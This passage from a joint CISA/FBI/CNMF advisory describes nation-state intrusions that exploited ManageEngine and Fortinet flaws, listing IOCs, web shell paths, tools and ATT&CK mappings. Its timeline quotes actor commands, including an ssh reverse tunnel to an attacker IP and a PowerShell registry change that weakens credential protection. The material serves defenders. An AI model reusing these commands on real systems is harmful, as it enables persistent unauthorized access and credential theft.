{
    "id": "2e48bd22-b13f-4cfd-bffb-0586fa4a2827",
    "created_at": "2023-09-12T02:06:15.589352Z",
    "updated_at": "2025-03-27T02:09:29.687249Z",
    "deleted_at": null,
    "sha1_hash": "ecbbaa6877057b4b3de456ae279f69f1b2bacbae",
    "title": "",
    "authors": "",
    "file_creation_date": "2023-09-07T09:36:44Z",
    "file_modification_date": "2023-09-07T09:36:56Z",
    "file_size": 701586,
    "plain_text": "_Co-Authored by:_ Product ID: AA23-250A\n\n\n# Multiple Nation-State Threat Actors Exploit CVE-2022-47966 and CVE-2022-42475\n\n## SUMMARY\n\n\nThe Cybersecurity and Infrastructure Security Agency\n(CISA), Federal Bureau of Investigation (FBI), and\nCyber National Mission Force (CNMF) identified the\npresence of indicators of compromise (IOCs) at an\nAeronautical Sector organization as early as January\n2023. Analysts confirmed that nation-state advanced\n[persistent threat (APT) actors exploited CVE-2022-](https://nvd.nist.gov/vuln/detail/CVE-2022-47966)\n[47966 to gain unauthorized access to a public-facing](https://nvd.nist.gov/vuln/detail/CVE-2022-47966)\napplication (Zoho ManageEngine ServiceDesk Plus),\nestablish persistence, and move laterally through the\nnetwork. This vulnerability allows for remote code\nexecution on the ManageEngine application. Additional\n[APT actors were also observed exploiting CVE-2022-](https://nvd.nist.gov/vuln/detail/CVE-2022-42475)\n[42475 to establish presence on the organization’s](https://nvd.nist.gov/vuln/detail/CVE-2022-42475)\nfirewall device.\n\n\n**Actions to take today to mitigate**\n**malicious cyber activity:**\n\n- Patch all systems for known\n[exploited vulnerabilities (KEVs),](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\nincluding firewall security appliances.\n\n- Monitor for unauthorized use of\nremote access software using\nendpoint detection tools.\n\n- Remove unnecessary (disabled)\naccounts and groups from the\nenterprise that are no longer\nneeded, especially privileged\naccounts.\n\n\nCISA and co-sealers are releasing this joint\nCybersecurity Advisory (CSA) to provide network defenders with tactics, techniques, and procedures\n(TTPs), IOCs, and methods to detect and protect against similar exploitation.\n\nFor a downloadable copy of IOCs, see:\n\n  - [AA23-250A STIX XML](https://www.cisa.gov/sites/default/files/2023-09/AA23-250A.stix_.xml)\n\n  - [AA23-250A STIX JSON](https://www.cisa.gov/sites/default/files/2023-09/AA23-250A%20Multiple%20Nation-State%20Threat%20Actors%20Exploit%20CVE-2022-47966%20and%20CVE-2022-42475.stix_.json)\n\nFor a downloadable copy of the Malware Analysis Report (MAR) accompanying this CSA, see: [MAR-](https://www.cisa.gov/sites/default/files/2023-09/MAR-10430311.c1.v1.CLEAR_.pdf)\n[10430311-1.v1 Multiple Nation-State Threat Actors Exploit CVE-2022-47966 and CVE-2022-42475](https://www.cisa.gov/sites/default/files/2023-09/MAR-10430311.c1.v1.CLEAR_.pdf)\n\n_To report suspicious or criminal activity related to information found in this Cybersecurity Advisory, contact CISA’s 24/7_\n_Operations Center at_ _[Report@cisa.gov](mailto:Report@cisa.gov)_ _or (888) 282-0870. When available, please include the following information regarding_\n_the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for_\n_the activity; the name of the submitting company or organization; and a designated point of contact._\n\n_This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries_\n_minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to_\n_standard copyright rules, TLP:CLEAR information may be distributed without restriction. For more information on the Traffic_\n_Li ht P_ _t_ _l_ _i_ _/tl_\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n## TECHNICAL DETAILS\n\n**[Note: This advisory uses the MITRE ATT&CK® for Enterprise](https://attack.mitre.org/versions/v13/matrices/enterprise/)** framework, version 13. See Tables 313 for the APT actors’ activity mapped to MITRE ATT&CK tactics and techniques with corresponding\nmitigation and/or detection recommendations.\n\n### Overview\n\nBy request of the impacted organization, CISA conducted an incident response engagement from\nFebruary to April 2023. CISA and co-sealers assess that beginning as early as January 2023, multiple\nnation-state APT actors were present on the organization’s network via at least two initial access\nvectors:\n\n     - **Initial Access Vector 1: APT actors exploited CVE-2022-47966 to access the organization’s**\nweb server hosting the public-facing application, Zoho ManageEngine ServiceDesk Plus.\n\n     - **Initial Access Vector 2: APT actors exploited CVE-2022-42475 to access the organization’s**\nfirewall device.\n\nCISA and co-sealers identified an array of threat actor activity, to include overlapping TTPs across\nmultiple APT actors. Per the activity conducted, APT actors often scan internet-facing devices for\nvulnerabilities that can be easily exploited. Firewall, virtual private networks (VPNs), and other edge\nnetwork infrastructure continue to be of interest to malicious cyber actors. When targeted, they can be\nleveraged to expand targeted network access, serve as malicious infrastructure, or a mixture of both.\n\n### APT Actor Activity\n\n#### Initial Access Vector 1\n\n[As early as January 2023, APT actors exploited CVE-2022-47966 [T1190] for initial access to the](https://attack.mitre.org/versions/v13/techniques/T1190/)\norganization’s web server hosting the public-facing application, Zoho ManageEngine ServiceDesk\nPlus. CISA observed indications in log files that a connection to the known malicious IP address\n```\n   192.142.226[.]153 was made as part of initial exploitation.\n\n```\nThrough exploitation of CVE-2022-47966, APT actors achieved root level access on the web server\n[and created a local user account [T1136.001] named Azure with administrative privileges [T1068].](https://attack.mitre.org/versions/v13/techniques/T1136/001/)\nActors were further able to download malware, enumerate the network, collect administrative user\ncredentials, and move laterally through the organization’s network. CISA and co-sealers were unable\nto determine if proprietary information was accessed, altered, or exfiltrated. This was due to the\norganization not clearly defining where their data was centrally located and CISA having limited\nnetwork sensor coverage.\n\n#### Initial Access Vector 2\n\nAdditional APT actors exploited CVE-2022-42475 on the organization’s firewall device, which was\nindicated by multiple successful VPN connections from known-malicious IPs between February 1-16,\n2023. It was identified that APT actors compromised and used disabled, legitimate administrative\n[account credentials [T1078.003] from a previously hired contractor—of which the organization](https://attack.mitre.org/versions/v13/techniques/T1078/003/)\nconfirmed the user had been disabled prior to the observed activity.\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\nAnalysis identified that a common behavior for these threat actors was to use disabled administrative\n[account credentials and delete logs from several critical servers in the environment [T1070.001]. This](https://attack.mitre.org/versions/v13/techniques/T1070/001/)\nprevented the ability to detect follow-on exploitation or data exfiltration. CISA and co-sealers were\nalso unable to further track the activity due to the organization not having Network Address\nTranslation (NAT) IP logging enabled.\n\n[APT actors initiated multiple Transport Layer Security (TLS)-encrypted sessions [T1573.002] on](https://attack.mitre.org/versions/v13/techniques/T1573/002/)\n[Transmission Control Protocol (TCP) port 10443 [T1571], indicating successful exchanges of data](https://attack.mitre.org/versions/v13/techniques/T1571/)\ntransfer from the firewall device. APT actors were observed connecting to the device from the\nfollowing actor-controlled C2 IP addresses:\n\n     - `144.202.2[.]71`\n\n     - `207.246.105[.]240`\n\n     - `45.77.121[.]232`\n\n     - `47.90.240[.]218`\n\nAPT actors further leveraged legitimate credentials to move from the firewall to a web server, where\nmultiple web shells were loaded—among other locations, such as the OWA server—into the following\ndirectories. Note: The following file paths to these web shells were received in coordination with a\ntrusted third-party; however, the artifacts were not received for analysis.\n\n     - `c:\\Program Files\\Microsoft Office Web Apps\\RootWebsite\\en-us\\resource.aspx`\n\n     - `c:\\inetpub\\wwwroot\\uninet\\css\\font-awesome\\css\\discover.ashx`\n\n     - `c:\\inetpub\\wwwroot\\uninet\\css\\font-awesome\\css\\configlogin.ashx`\n\n     - `c:\\Program Files\\Common Files\\Microsoft Shared\\Web Server`\n```\n       Extensions\\15\\template\\layouts\\approveinfo.aspx\n\n```\n     - `c:\\Program Files\\Microsoft Office Web Apps\\RootWebsite\\infos.aspx`\n\n     - `c:\\Program Files\\Microsoft Office Web Apps\\RootWebsite\\errorinfo.aspx`\n\n     - `c:\\Program Files\\Microsoft Office Web Apps\\RootWebsite\\infos.ashx`\n\n     - `c:\\Program Files\\Microsoft Office Web Apps\\RootWebsite\\en-us\\error.aspx`\n\n     - `c:\\Program Files\\Microsoft Office Web Apps\\RootWebsite\\en-us\\infos.aspx`\n\n     - `c:\\Program Files\\Microsoft Office Web Apps\\RootWebsite\\en-us\\info.aspx`\n\n     - `c:\\Program Files\\Microsoft Office Web Apps\\RootWebsite\\en-us\\info-1.aspx`\n\n     - `c:\\Program Files\\Microsoft Office Web Apps\\RootWebsite\\en-us\\new_list.aspx`\n\n     - `c:\\Program Files\\Microsoft Office Web Apps\\RootWebsite\\en-us\\errorinfo.aspx`\n\n     - `c:\\Program Files\\Microsoft Office Web Apps\\RootWebsite\\en-us\\lgnbotr.ashx`\n\n     - `c:\\inetpub\\passwordchange\\0LECPNJYRH.aspx`\n\n     - `c:\\inetpub\\passwordchange\\9ehj.aspx`\n\n     - `c:\\inetpub\\wwwroot\\wss\\VirtualDirectories\\Portal80\\_vti_pvt\\servicesinfo.ashx`\n\n     - `c:\\inetpub\\wwwroot\\wss\\VirtualDirectories\\Portal80\\_vti_pvt\\services.aspx`\n\n     - `c:\\inetpub\\redirectedSites\\[REDACTED]\\products\\uns1fw.aspx`\n\n     - `c:\\inetpub\\redirectedSites\\[REDACTED]\\products\\uns1ew.aspx`\n\nThe following IP addresses were identified as associated with the loaded web shells:\n\n     - `45.90.123[.]194`\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n     - `154.6.91[.]26`\n\n     - `154.6.93[.]22`\n\n     - `154.6.93[.]5`\n\n     - `154.6.93[.]12`\n\n     - `154.6.93[.]32`\n\n     - `154.6.93[.]24`\n\n     - `184.170.241[.]27`\n\n     - `191.96.106[.]40`\n\n     - `102.129.145[.]232`\n\n#### Forensic Timeline of APT Actor Activity\n\nTables 1 and 2 list the timeline of events discovered during the incident response, as well as tools\nused by the APT actors to conduct their operations, respectively. All timestamps are presented in\nCoordinated Universal Time (UTC).\n\n_Table 1: Timeline of APT Actor Activity_\n\n|Timestamp (UTC)|Event|Description|\n|---|---|---|\n|2023-01-18 11:57:02|Hello World User-Agent string observed in 44 total events. Uniform Resource Identifier (URI): /cgi-bin/downloadFlile[.]cgi|Hello World, the User-Agent string inside of the initiated HTTP request, was observed during communication between the organization’s web server and malicious command and control (C2) server IP 92.118.39[.]82 [T1071.001]. This string has been observed in open source as an initial step of the Mirai botnet to download malicious artifacts [T1583.005].[1]|\n|2023-01-20|Attempts made to export three files; associated with malicious IP 192.142.226[.]153.|APT actors attempted to export [TA0009], [TA0010] three files, which were analyzed and identified as Local Security Authority Subsystem Service (LSASS) dump files. These files were renamed with .zip and .gif extensions to evade detection [T1036.008]. Analysis confirmed the APT actors were unsuccessful at exfiltrating these files:  wo_view_bg.zip (09:06:37 UTC)  wo_view_bg1.gif (09:08:11 UTC)  wo_view_bg2.gif (09:19:43 UTC) Note: If local administrative access is achieved on a victim host, dumping LSASS credentials may allow for lateral movement across the environment. This behavior was identified during the engagement and is detailed throughout Table 1.|\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n|Timestamp (UTC)|Event|Description|\n|---|---|---|\n|2023-01-20 16:51:05|Successful web server exploitation via CVE-2022-47966.|Successful web server (Zoho ManageEngine ServiceDesk Plus) exploitation via CVE-2022-47966.|\n|2023-01-21 06:46:42|Azure local user account with administrative permissions created.|A local user account with administrative permissions, named Azure, was created on the server hosting ServiceDesk Plus.|\n|2023-01-21 06:49:40|LSASS dumped by Azure user.|The Azure user successfully accessed and dumped credentials stored in the process memory of LSASS for the Active Directory (AD) domain [T1003.001]. Note: Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.|\n|2023-01-21 06:50:59|Mimikatz.exe downloaded via ConnectWise ScreenConnect.|The legitimate ConnectWise ScreenConnect client was utilized to connect to the ServiceDesk system, download mimikatz.exe, and execute malicious payloads to steal credentials [T1219], [T1588.002]. Note: ConnectWise ScreenConnect was observed in multiple locations within the organization’s environment, but the organization confirmed that it was not authorized software. Analysis assessed APT actors downloaded the legitimate software for malicious, illegitimate use prior to the download of mimikatz.exe.|\n|2023-01-21 07:34:32|Bitmap.exe malware downloaded and designated to connect to C2 IP 179.60.147[.]4.|Azure user account downloaded bitmap.exe to the ServiceDesk system to execute an obfuscated, embedded malicious payload from its C2 server [T1027.009]. This malware is identified as a variant of Metasploit (Meterpreter). See MAR-10430311-1.v1 for additional details.|\n|2023-01-21 08:46:23|Mimikatz credential dump files created.|Two files (c:\\windows\\system32\\fuu.txt, c:\\windows\\system32\\jojo.txt) were created as means for Mimikatz to dump/write credentials to disk on the ServiceDesk system [T1003].|\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n|Timestamp (UTC)|Event|Description|\n|---|---|---|\n|2023-01-21 09:25:58|Legitimate files/applications nmap.exe and npcap.exe downloaded.|Azure user account downloaded nmap.exe [T1018] and npcap.exe [T1040] to continue network and credential information gathering efforts. Though legitimate applications, APT actors used these files for illegitimate, malicious purposes. Note: Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.|\n|2023-01-21 13:56:14|ssh2.zip downloaded by the Azure user account.|APT actors downloaded the file ssh2.zip via the Azure user account, which contained legitimate files that could have been leveraged for malicious purposes. When unzipped, the following files were extracted:  install-sshd.ps1 (script)  psexec.exe  sshd.exe  ssh.exe  ssh-sk-helper.exe  libcrypto.dll Note: CISA analyzed these files and did not identify the files as malicious. However, ssh.exe was downloaded to establish persistence on the ServiceDesk system via SSH [T1133] and is detailed in the scheduled task below.|\n|2023-01-21 14:31:01|SSH tools downloaded to establish reverse (remote) communication.|Three identified executables, which provide a command line interface with the compromised system, were observed in the following file system locations:  c:\\windows\\system32\\ssh-shellhost.exe  c:\\windows\\system32\\ssh-agent.exe  c:\\windows\\system32\\ssh-add.exe While the files were not identified as malicious, they were loaded for malicious purposes.|\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n|Timestamp (UTC)|Event|Description|\n|---|---|---|\n|2023-01-21 14:33:11|license validf scheduled task created to communicate with malicious IP 104.238.234[.]145.|license validf scheduled task [T1036.004] was created to execute ssh.exe on a recurring basis on the ServiceDesk system [T1053.005]: c:\\Windows\\System32\\ssh.exe -N -f -R 12100 sst@104.238.234.145 -p 443 -o StrictHostKeyChecking=no|\n|2023-01-21 14:51:49|PsExec executed on the ServiceDesk system.|Analysis identified evidence and execution of two files (PsExec.exe and psexec.exe) on the ServiceDesk system. These files were determined to be benign. APT actors utilized PsExec to create a scheduled task and force-store administrative credentials to the local machine. psexec.exe -i -s C:\\Windows\\System32\\mmc.exe /s C:\\Windows\\System32\\taskschd.msc powershell New-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name \"DisableRestrictedAdmin\" -Value \"0\" - PropertyType DWORD -Force Note: PsExec, a command line utility from Microsoft's Sysinternals Suite, is known to be used for lateral movement; evidence of lateral movement via PsExec has not been confirmed.|\n|2023-01-21 14:55:02|ProcDump created on the ServiceDesk system.|ProcDump was created within the c:\\windows\\system32\\prc64.exe directory. This was later identified as a method for enumerating running processes/applications [T1057] and dumping LSASS credentials.|\n|2023-01-21 14:02:45|Ngrok token created, renamed to ngrok.yml config file, and Remote Desktop Protocol (RDP) connection established.|Ngrok was used to establish an RDP connection [T1021.001]—another method of maintaining persistence on the ServiceDesk system. In this instance, Ngrok was used to establish a reverse proxy connection to the ServiceDesk system. At the time of analysis, the firewall access control lists (ACLs) allowed all outbound connections. Considering APT actors utilized an outbound proxy, the RDP session was successfully established as the connection was initiated from the ServiceDesk system.|\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n|Timestamp (UTC)|Event|Description|\n|---|---|---|\n|||Note: RDP is a common feature in operating systems, which allows a user to log into an interactive session with a system desktop graphical user interface on a remote system.|\n|2023-01-24 15:07:18|Apache Log4j exploit attempted against the ServiceDesk system.|APT actors attempted to exploit a known Apache Log4j vulnerability (CVE-2021-44228) in the ServiceDesk system but were unsuccessful. The two IPs and one domain associated with this exploitation attempt are:  80.85.241[.]15  68.177.56[.]38  main.cloudfronts[.]net|\n|2023-01-25 00:17:33|Mimikatz credential dump files created.|One file (c:\\ManageEngine\\ServiceDesk\\bin\\1.txt) was created as a method for Mimikatz to dump/write credentials to disk on the ServiceDesk system. Note: This is a different path and time associated with Mimikatz than listed above.|\n|2023-01-29|HTTP-GET requests sent to C2 IP 92.118.39[.]82.|The server hosting ServiceDesk was observed beaconing/sending HTTP-GET requests to a suspected APT-controlled C2 server, indicating malware was successfully implanted.|\n|2023-02-02 05:51:08|Resource.aspx web shell detected.|Using additionally compromised, legitimate administrative credentials, APT actors logged into the Outlook Web Application (OWA) server from the ServiceDesk system. The actors dropped an Active Server Pages Extended (ASPX) web shell in the following file system location, which was designed to execute remote JavaScript code [T1059.007] on the OWA server [T1505.003]:  c:\\Program Files\\Microsoft Office Web Apps\\RootWebSite\\en-us\\resource.aspx Note: The administrative user’s credentials were obtained from the APT actors’ collection (LSASS dump) of credentials from the entire AD domain. This user is separate from the actor-created Azure user account. See MAR-10430311-1.v1 for additional details.|\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n|Timestamp (UTC)|Event|Description|\n|---|---|---|\n|2023-02-02 18:45:58|Metasploit service installed.|APT actors installed Metasploit with the following attributes on the organization’s domain controller [T1059.001]:  Service Name: QrrCvbrvnxasKTSb [T1543.003]  Service File Name: %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c &amp;quot;if([IntPtr]::Size -eq 4) [T1564.003] Note: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform several actions, including discovery of information and execution of code.|\n|2023-02-03 03:27:59|ConfigLogin.aspx web shell detected.|APT actors dropped an additional ASPX web shell on a web server in the following file system location:  c:\\inetpub\\wwwrot\\uninet\\css\\font- awesome\\css\\ConfigLogin.aspx See MAR-10430311-1.v1 for additional details.|\n|2023-02-03 15:12:23|wkHPd.exe created to communicate with malicious IP 108.62.118[.]160.|APT actors created and used a variant of Metasploit (Meterpreter) on the ServiceDesk system, listed as wkHPd.exe [T1587.001]. This variant serves as an attack payload that runs an interactive shell and allows a malicious actor to control and execute code on a system. See MAR-10430311-1.v1 for additional details.|\n|2023-02-08 08:56:35, 2023-02-09 20:19:59, 2023-03-04, 2023-03-18|Hypertext Preprocessor (PHP) files uploaded via HTTP-POST request from malicious IP 193.142.146[.]226.|PHP files were uploaded to the ServiceDesk system via HTTP-POST request. APT actors were observed writing 16 instances of the following files to disk:  [REDACTED]/wp- content/themes/seotheme/db.php (12 instances)  [REDACTED]/wp- content/plugins/ioptimization/IOptimize.php (4 instances)|\n|2023-03-06|Interact.sh|APT actors executed Domain Name System (DNS) scanning at an additional server (not the ServiceDesk|\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n**Timestamp**\n\n**Event** **Description**\n**(UTC)**\n\n06:49:40 system) and directed callback to the Interact.sh\ndomain, which indicated the server was susceptible to a\n[DNS-style attack [T1046].](https://attack.mitre.org/versions/v13/techniques/T1046/)\n\nDestination IP: 103.105.49[.]108\n\nPost-engagement analysis was extended but analysts were unable to determine additional actions\ntaken by the APT actors, likely due to a lack of sensor coverage and data unavailability. With the data\navailable, it was determined APT actors used the tools listed in Table 2 during their operations.\n\n_Table 2: Observed Tools Used by APT Actors_\n\n|Timestamp (UTC)|Event|Description|\n|---|---|---|\n|06:49:40||system) and directed callback to the Interact.sh domain, which indicated the server was susceptible to a DNS-style attack [T1046]. Destination IP: 103.105.49[.]108|\n\n|Tool|Description|Observation|\n|---|---|---|\n|Mimikatz [2]|A credential dumping tool capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks.|In addition to using Mimikatz for credential dumping, APT actors dumped the following Windows Registry Hive files:  sam.hiv [T1003.002]  system.hiv  security.hiv These files were dumped to obtain registry information such as users on the system, data used by the operating system [T1012], and installed programs.|\n|Ngrok [3]|Ngrok software operates by running a client process on the machine and creating a private connection tunnel to a designated open port. Ngrok delivers instant ingress to applications in any cloud, private network, or devices with authentication, load balancing, and other critical controls. In recent years, Ngrok has been leveraged maliciously by a variety of threat actors, including use for persistence, lateral movement, and data exfiltration.[4],[5],[6]|Using Ngrok as an external service, APT actors were able to gain access to and utilize the command line on victim systems [T1572]. Note: CISA and co-sealers have observed this commonly used commercial platform being abused by malicious actors to bypass typical firewall controls. Ngrok’s ability to tunnel RDP and other services securely over internet connections makes it a target for abuse by malicious actors.|\n|ProcDump|A command-line application used to monitor processes and create crash dump files. A crash dump file contains the data loaded in memory at the time the dump was triggered.|APT actors used ProcDump to conduct reconnaissance and examine spawned processes (applications in use). This tool was also utilized as a utility for dumping|\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n|Tool|Description|Observation|\n|---|---|---|\n||It is typically used for troubleshooting errors with an application or operating system.|credentials from the server hosting ServiceDesk Plus.|\n|Metasploit|Metasploit is an open-source penetration testing software.|APT actors’ specific use of Meterpreter—an attack payload of Metasploit—serves as an interactive shell and allows threat actors to control and execute code on a system.|\n|Interact.sh|An open-source tool for detecting external interactions (communication).[7] This tool is used to detect callbacks from target systems for specified vulnerabilities and commonly used during the reconnaissance stages of adversary activity.|APT actors likely used Interact.sh to refrain from using and disclosing their own C2 infrastructure.|\n|anydesk.exe|A remote desktop application that provides platform-independent remote access to personal computers and other devices running the host application. It offers remote control, file transfer, and VPN functionality.|Between early-February and mid-March 2023, anydesk.exe was observed on three hosts with different certificate issuers and hashes—none of which were the certified issuer [T1553.002]. APT actors compromised one host and moved laterally to install the executable on the remaining two [T1570]— listed in order of time, as follows:  c:\\programdata\\anydesk.exe  c:\\Users\\[REDACTED]\\Downloads\\AnyD esk.exe  c:\\Users\\[REDACTED]\\Documents\\pers onal\\program\\AnyDesk.exe Note: Analysts confirmed APT actors’ weaponized use of anydesk.exe but were unable to confirm how the software was installed on each host.|\n|quser.exe|A valid program on Windows machines that displays information about user sessions on a Remote Desktop Session Host server [T1049], including the name of the user, name of the session on the remote desktop session host server, session ID, state of the session (active or disconnected), idle time (number of minutes since last keystroke or mouse movement), and date/time the user logged on.[8]|APT actors were observed using this tool as early as March 2023 across four locations with the same name but different hashes (one of which is associated with the Portuguese [Brazil] language pack): c:\\ProgramFiles\\WindowsApps\\Microsof t.LanguageExperiencePackpt- BR_19041.56.186.0_neutral__8wekyb3d8 bbwe\\Windows\\System32\\pt-BR|\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n**Tool** **Description** **Observation**\n\n**xpack.exe** A custom .NET loader that decrypts (AES), `Xpack.exe indicators were present on`\nloads, and executes accompanying files. multiple organization hosts, with an\n\nunverified user account observed navigating\nto the sites: xpack.github[.]io and\n```\n                                xpack.disqus[.]com. Additionally, one\n\n```\nadministrator account and multiple user\naccounts were observed executing the\n```\n                                xpack.exe file from a hidden directory\n\n```\n[[T1564.001]:](https://attack.mitre.org/versions/v13/techniques/T1564/001/)\n```\n                                c:\\USERS\\[REDACTED]\\.P2\\POOL\\PLUGINS\n                                \\ORG.ECLIPSE.EMBEDCDT.TEMPLATES.XPAC\n                                K_6.3.1.202210101738\n\n```\nThis malware was predominantly used to\nexecute system commands, drop additional\nmalware and tools, and stage data for\n[exfiltration [T1074]. Note: The data](https://attack.mitre.org/versions/v13/techniques/T1074/)\nexfiltrated is unknown.\n\n## MITRE ATT&CK TACTICS AND TECHNIQUES\n\nSee Tables 3-13 for all referenced APT actors’ tactics and techniques for enterprise environments in\nthis advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework,\n[see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider](https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping)\n[Tool.](https://github.com/cisagov/Decider/)\n\n_Table 3: Resource Development_\n\n|Tool|Description|Observation|\n|---|---|---|\n|xpack.exe|A custom .NET loader that decrypts (AES), loads, and executes accompanying files.|Xpack.exe indicators were present on multiple organization hosts, with an unverified user account observed navigating to the sites: xpack.github[.]io and xpack.disqus[.]com. Additionally, one administrator account and multiple user accounts were observed executing the xpack.exe file from a hidden directory [T1564.001]: c:\\USERS\\[REDACTED]\\.P2\\POOL\\PLUGINS \\ORG.ECLIPSE.EMBEDCDT.TEMPLATES.XPAC K_6.3.1.202210101738 This malware was predominantly used to execute system commands, drop additional malware and tools, and stage data for exfiltration [T1074]. Note: The data exfiltrated is unknown.|\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Acquire Infrastructure: Botnet|T1583.005|Actors used User-Agent string Hello World as an initial step of the Mirai botnet to later download malicious artifacts.|\n|Develop Capabilities: Malware|T1587.001|Actors created and used a variant of Metasploit (Meterpreter) on the ServiceDesk system, listed as wkHPd.exe. This malware serves as an attack payload that runs an interactive shell; it allows for control and code execution on a system.|\n|Obtain Capabilities: Exploits|T1588.002|Actors leveraged the legitimate ConnectWise ScreenConnect client to download and utilize the credential dumping tool, mimikatz.exe.|\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n_Table 4: Initial Access_\n\n**Technique Title** **ID** **Use**\n\nActors exploited a known vulnerability (CVE-2022-47966) in\nthe organization’s web server hosting Zoho ManageEngine\n\nExploit Public- ServiceDesk Plus.\n[T1190](https://attack.mitre.org/versions/v13/techniques/T1190/)\nFacing Application Actors also attempted to exploit a known Apache Log4j\n\nvulnerability (CVE-2021-44228) in the ServiceDesk system\nbut were unsuccessful.\n\n_Table 5: Execution_\n\n**Technique Title** **ID** **Use**\n\nCommand and\n\nActors installed and used Metasploit via PowerShell on the\n\nScripting Interpreter: [T1059.001](https://attack.mitre.org/versions/v13/techniques/T1059/001/)\n\norganization’s domain controller.\n\nPowerShell\n\nCommand and\n\nActors dropped an ASPX web shell on the OWA server,\n\nScripting Interpreter: [T1059.007](https://attack.mitre.org/versions/v13/techniques/T1059/007/)\n\nwhich was designed to execute remote JavaScript code.\n\nJavaScript\n\n_Table 6: Persistence_\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Exploit Public- Facing Application|T1190|Actors exploited a known vulnerability (CVE-2022-47966) in the organization’s web server hosting Zoho ManageEngine ServiceDesk Plus. Actors also attempted to exploit a known Apache Log4j vulnerability (CVE-2021-44228) in the ServiceDesk system but were unsuccessful.|\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Command and Scripting Interpreter: PowerShell|T1059.001|Actors installed and used Metasploit via PowerShell on the organization’s domain controller.|\n|Command and Scripting Interpreter: JavaScript|T1059.007|Actors dropped an ASPX web shell on the OWA server, which was designed to execute remote JavaScript code.|\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Scheduled Task/Job: Scheduled Task|T1053.005|Actors created the scheduled task license validf to execute ssh.exe on a recurring basis. This executable was observed as means of establishing persistence on the ServiceDesk system.|\n|Valid Accounts: Local Accounts|T1078.003|Actors compromised and utilized account credentials from a previously hired contractor, of which the contract ended prior to the timeframe of observed activity.|\n|External Remote Services|T1133|ssh.exe executes on a recurring basis via a scheduled task on the ServiceDesk system as a method for access via SSH.|\n|Create Account: Local Account|T1136.001|Actors created a local account with administrative permissions on the server hosting ServiceDesk Plus.|\n|Server Software Component: Web Shell|T1505.003|Actors logged into the OWA server from the ServiceDesk system and dropped an ASPX web shell to establish persistent access and execute remote code.|\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n**Technique Title** **ID** **Use**\n\nCreate or Modify\nSystem Process: [T1543.003](https://attack.mitre.org/versions/v13/techniques/T1543/003/) Actors created a Windows Service via Metasploit.\nWindows Service\n\n_Table 7: Privilege Escalation_\n\n**Technique Title** **ID** **Use**\n\nThrough exploitation of CVE-2022-47966, actors were given\n\nExploitation for\n[T1068](https://attack.mitre.org/versions/v13/techniques/T1068/) root level access on the web server and created a local user\nPrivilege Escalation\n\naccount named Azure with administrative privileges.\n\n_Table 8: Defense Evasion_\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Create or Modify System Process: Windows Service|T1543.003|Actors created a Windows Service via Metasploit.|\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Exploitation for Privilege Escalation|T1068|Through exploitation of CVE-2022-47966, actors were given root level access on the web server and created a local user account named Azure with administrative privileges.|\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Indicator Removal: Clear Windows Event Logs|T1070.001|Actors compromised and used disabled, legitimate administrative account credentials to delete logs from several critical servers in the environment.|\n|Masquerading: Masquerade Task or Service|T1036.004|Actors created a scheduled task license validf, which appears as legitimate/benign and executes ssh.exe on a recurring basis on the ServiceDesk system.|\n|Masquerading: Masquerade File Type|T1036.008|Actors attempted to export three files, which were analyzed and identified as LSASS dump files. These files were renamed with .zip and .gif extensions to evade detection.|\n|Obfuscated Files or Information: Embedded Payloads|T1027.009|Actors downloaded the malware bitmap.exe on the ServiceDesk system to execute an obfuscated, embedded malicious payload from its C2 server.|\n|Subvert Trust Controls: Code Signing|T1553.002|Anydesk.exe was observed on three hosts with different 